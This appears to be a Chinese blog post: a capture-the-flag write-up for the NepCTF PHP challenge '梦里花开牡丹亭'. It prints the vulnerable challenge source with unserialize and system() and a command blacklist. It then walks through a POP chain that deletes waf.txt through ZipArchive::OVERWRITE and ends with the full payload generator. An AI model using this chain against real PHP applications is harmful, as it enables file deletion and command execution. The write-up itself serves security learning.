@@ -1,0 +1,226 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>nepctf_梦里花开牡丹亭 - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="一道考点比较有趣的题目，虽然不难而且有点绕，但是感觉思路还是很精妙的！
+首先打开题目可以看到源码：
+读取shell.php12345678910111213141516171819202122232,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">nepctf_梦里花开牡丹亭</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">nepctf_梦里花开牡丹亭</h1>
+        <div class="stuff">
+            <span>三月 22, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>一道考点比较有趣的题目，虽然不难而且有点绕，但是感觉思路还是很精妙的！</p>
+<p>首先打开题目可以看到源码：</p>
+<h1 id="读取shell-php"><a href="#读取shell-php" class="headerlink" title="读取shell.php"></a>读取shell.php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $username;</span><br><span class="line">    <span class="keyword">public</span>  $password;</span><br><span class="line">    <span class="keyword">public</span>  $choice;</span><br><span class="line">    <span class="keyword">public</span>  $register;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  $file;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span>  $content;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice=<span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;choice-&gt;checking(<span class="keyword">$this</span>-&gt;username,<span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file,$filename,$content</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=$filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content=$content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params">$username,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($username===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;$password===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file-&gt;open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params">$username,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($username===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;$password===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params">$filename, $content</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell($content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents($filename.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;a&#x27;</span>]!==$_GET[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(md5($_GET[<span class="string">&#x27;a&#x27;</span>]) === md5($_GET[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (sha1($_GET[<span class="string">&#x27;a&#x27;</span>])=== sha1($_GET[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">    @unserialize(base64_decode($_POST[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们的最终目的是读取文件，所以需要利用到题目中给到的Open类中的open函数，查看哪里使用open函数，该题思路比较简单，就是</p>
+<p>open-&gt;login-&gt;game 这三个类</p>
+<p>首先第一步的绕过直接用数组绕过即可，这个简单，重点是反序列化我们，查POP链，一开始我以为是绕过wakeup函数，后来发现没法绕了（7.0+版本已消除了该问题），浪费了蛮多时间的，但是也没啥关系，我们直接走wakeup出发</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line"><span class="comment">//            echo $this-&gt;content;</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice=<span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到这里会先看我们的regiter的md5值,md5翻译出来就是admin，成功的话就会调用login，失败了就会去register，但是register没啥用，所以我们要保证能进入login当中，故第一步的payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="keyword">new</span> Game();</span><br><span class="line">$a-&gt;register=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来看login函数：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file,$filename,$content</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=$filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content=$content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params">$username,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($username===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;$password===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file-&gt;open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现login函数的checking函数会对用户名和密码进行检查，检查过后就会调用this-&gt;file的open函数，故我们需要构建：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">$a-&gt;password=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">$c = <span class="keyword">new</span> Open();</span><br><span class="line">$a-&gt;file = $c;</span><br></pre></td></tr></table></figure>
+
+<p>再看Open函数做了什么</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params">$filename, $content</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell($content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents($filename.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现当没有waf.txt的时候便会执行shell函数：但是当前我们不知道shell.php的用法，如果有waf.txt则会读取文件，目前我们是有waf.txt的，所以可以读取文件，那么接着构造payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a-&gt;filename = <span class="string">&#x27;shell&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样就可以读取到文件shell.php</p>
+<p><img src="image-20210322110750049.png" alt="image-20210322110750049"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params">$cmd</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($cmd)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,$cmd))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>到这就傻眼了，虽然这个绕过不难，但是我该怎么调用shell函数呢？这时再回头看，发现open函数如果没有找到waf.txt的话就会调用。。这就傻眼了，这怎么可能可以？</p>
+<h1 id="删除waf-txt"><a href="#删除waf-txt" class="headerlink" title="删除waf.txt"></a>删除waf.txt</h1><p>这时候就要重新回顾题目了，题目调用到了open函数，但是我们可以猜想open函数难道只能用当前题目的Open类吗？是不是有其他内置类也有同名函数呢。所以上php官网去查找了一番，果然最终找到</p>
+<p><img src="image-20210322110328291.png" alt="image-20210322110328291"></p>
+<p><img src="image-20210322110418083.png" alt="image-20210322110418083"></p>
+<p>那么这样就可以解决了，构造payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a-&gt;file=<span class="keyword">new</span> ZipArchive;</span><br><span class="line">$a-&gt;filename=<span class="string">&#x27;waf.txt&#x27;</span>;</span><br><span class="line">$a-&gt;content = ZipArchive::OVERWRITE</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以删除掉文件</p>
+<h1 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h1><p>这个就是最简单的一部了，直接php  /flag 即可，最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;new Game();</span><br><span class="line">$a-&gt;username&#x3D;&#39;admin&#39;;</span><br><span class="line">$a-&gt;password&#x3D;&#39;admin&#39;;</span><br><span class="line"></span><br><span class="line">$c&#x3D;new Open();</span><br><span class="line">$a-&gt;file&#x3D;$c;</span><br><span class="line">&#x2F;&#x2F;$c&#x3D;new Open();</span><br><span class="line">&#x2F;&#x2F;$a-&gt;file&#x3D;new ZipArchive;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;$a-&gt;content&#x3D;&#39;php &#x2F;flag&#39;;</span><br><span class="line">&#x2F;&#x2F;$a-&gt;content&#x3D;ZipArchive::OVERWRITE;</span><br><span class="line">&#x2F;&#x2F;$a-&gt;content&#x3D;&#39;php &#x2F;flag&#39;;</span><br><span class="line">$a-&gt;content&#x3D;&#39;php &#x2F;flag&#39;;</span><br><span class="line">$a-&gt;filename&#x3D;&quot;waf.txt&quot;;</span><br><span class="line"></span><br><span class="line">$s&#x3D; (serialize($a));</span><br><span class="line">echo base64_encode($s);</span><br><span class="line">unserialize($s);</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20210322110955960.png" alt="image-20210322110955960"></p>
+<p>总结：</p>
+<p>感觉这题目的思路挺好的，利用到了内置类的知识，相当有趣~（虽然做的时候呗绕来绕去</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96shell-php"><span class="toc-number">1.</span> <span class="toc-text">读取shell.php</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A0%E9%99%A4waf-txt"><span class="toc-number">2.</span> <span class="toc-text">删除waf.txt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="toc-number">3.</span> <span class="toc-text">绕过过滤</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
